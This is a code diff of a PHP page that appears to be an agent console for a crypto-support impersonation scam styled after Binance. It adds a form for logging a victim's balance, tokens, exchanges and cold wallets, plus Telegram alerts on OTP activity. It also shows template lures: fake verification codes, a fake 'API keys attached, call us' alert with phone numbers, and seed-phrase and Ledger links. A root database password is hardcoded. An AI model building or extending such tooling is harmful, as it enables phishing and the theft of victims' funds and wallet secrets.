@@ -2,17 +2,22 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 date_default_timezone_set('Europe/London');
+require_once 'functions.php';
+
 //exit("Hello World");
 $agent  = $_GET['agent']  ?? 'Unknown';
 $caller = $_GET['caller'] ?? 'Unknown';
 
+$department = '';
+
 $conn = mysqli_connect('localhost', 'root', '$Provis@2025', 'fromzero_morevitility');
 if ($conn && $agent !== 'Unknown') {
     $eAgent = mysqli_real_escape_string($conn, $agent);
-    $sql = "SELECT role FROM ausers WHERE user = '$eAgent' LIMIT 1";
+    $sql = "SELECT au.role, au.adminid, ad.department FROM ausers as au JOIN adminuser as ad ON au.adminid = ad.id WHERE user = '$eAgent' LIMIT 1";
     $result = mysqli_query($conn, $sql);
     if ($row = mysqli_fetch_assoc($result)) {
         $role = strtolower($row['role']);
+        $department = $row['department'] ?? '';
     }
     //mysqli_close($conn);
 }
@@ -50,6 +55,18 @@ function insertdata($conn, $agent, $caller)
         file_put_contents(date('Y-m-d') . "newdata_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
     }
 }
+
+if (isset($role) && $role == 'open') {
+
+    $jsonData = [
+        'Activity' => 'OTP',
+        'Department' => $department,
+        'Agent' => $agent . ' (Open)',
+    ];
+
+    sendDataToTelegramBot($jsonData);
+}
+
 ?>
 <!DOCTYPE html>
 <html lang="en" class="dark">
@@ -60,8 +77,9 @@ function insertdata($conn, $agent, $caller)
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
-	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>    <script>
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
+    <script>
         tailwind.config = {
             darkMode: 'class',
             theme: {
@@ -77,6 +95,32 @@ function insertdata($conn, $agent, $caller)
     <style>
         #toast-container>div {
             width: 350px;
+        }
+
+        .example-toggle {
+            transition: background-color 0.2s ease;
+        }
+
+        .example-toggle:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .arrow-icon {
+            transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transform-origin: center;
+        }
+
+        .example-content {
+            overflow: hidden;
+        }
+
+        .example-content.hidden {
+            display: none !important;
+        }
+
+        /* Additional smoothness for the rotation */
+        .arrow-icon.rotate-90 {
+            transform: rotate(90deg);
         }
     </style>
 </head>
@@ -102,7 +146,7 @@ function insertdata($conn, $agent, $caller)
     </div>
 
     <!-- Main Container -->
-    <div class="flex  justify-center md:px-4 px-2 py-4">
+    <div id="main-container" data-department="<?php echo $department; ?>" class="flex justify-center md:px-4 px-2 py-4">
         <div class="md:max-w-md md:min-w-[28rem] relative">
 
             <!-- Reference Input -->
@@ -136,47 +180,120 @@ function insertdata($conn, $agent, $caller)
                 <!-- Verify -->
                 <div class="mb-8">
                     <button id="btn-reference-verify" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Verify</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
-                        <strong>Example:</strong><br>
-                            Your verification code is <span id="verification-code" class="font-bold"><!-- dynamic data--></span><br>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="verify-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="verify-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            Your verification code is <span id="verification-code" class="font-bold">876-827</span><br>
                             Never share this code with anyone. Only a genuine advisor will confirm it to you.
+                        </div>
                     </div>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3">
+                            <strong>Qualification:</strong>
+                        </div>
+
+                        <form id="user-info-form" class="space-y-4 p-3 mt-1">
+                            <div>
+                                <label for="last_login" class="block text-sm font-medium text-white mb-1">🕒 Last Login:</label>
+                                <input type="text" id="last_login" name="last_login" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                            </div>
+                            <div>
+                                <label for="balance" class="block text-sm font-medium text-white mb-1">💵 Balance:</label>
+                                <input type="text" id="balance" name="balance" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                            </div>
+                            <div>
+                                <label for="tokens" class="block text-sm font-medium text-white mb-1">🪙 Tokens:</label>
+                                <input type="text" id="tokens" name="tokens" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                            </div>
+                            <div>
+                                <label for="exchanges" class="block text-sm font-medium text-white mb-1">🏦 Exchanges:</label>
+                                <input type="text" id="exchanges" name="exchanges" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                            </div>
+                            <div>
+                                <label for="cold_wallets" class="block text-sm font-medium text-white mb-1">❄️ Cold Wallets:</label>
+                                <input type="text" id="cold_wallets" name="cold_wallets" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                            </div>
+                            <div>
+                                <label for="notes" class="block text-sm font-medium text-white mb-1">🗒 Notes:</label>
+                                <textarea id="notes" name="notes" rows="3" class="w-full px-3 py-2 rounded border border-gray-300 text-black"></textarea>
+                            </div>
+                            <div class="flex justify-end">
+                                <button type="submit" id="save-user-info" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] hover:bg-binance-brand-gold text-black px-4 py-2 text-base rounded hover:opacity-[0.8] hover:bg-binance-brand-gold">
+                                    Submit
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+
                 </div>
 
                 <!-- API Key -->
                 <div class="mb-8">
                     <button id="btn-api-key" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
-                        <strong>Example:</strong><br>
-                        API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on <br>
-                        <span id="support-phone"><!-- dynamic data--></span>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="api-key-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="api-key-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on <br>
+                            <span id="support-phone">+61 1800576977 or +61 26105933</span>
+                        </div>
                     </div>
                 </div>
 
                 <!-- API key cancel -->
                 <div class="mb-8">
                     <button id="btn-api-cancel" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
-                        <strong>Example:</strong><br>
-                        External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="api-cancel-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="api-cancel-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
+                        </div>
                     </div>
                 </div>
 
                 <!-- Seed Phrase -->
                 <div class="mb-8">
                     <button id="btn-seed-phrase" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
-                        <strong>Example:</strong><br>
-                        <span id="seed-url"><!-- dynamic data--></span>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="seed-phrase-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="seed-phrase-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            <span id="seed-url">Seed.com/ref123</span>
+                        </div>
                     </div>
                 </div>
 
                 <!-- Ledger -->
                 <div class="mb-8">
                     <button id="btn-ledger" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
-                        <strong>Example:</strong><br>
-                        <span id="ledger-url"><!-- dynamic data--></span>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="ledger-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="ledger-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            <span id="ledger-url">Ledger.com</span>
+                        </div>
                     </div>
                 </div>
 
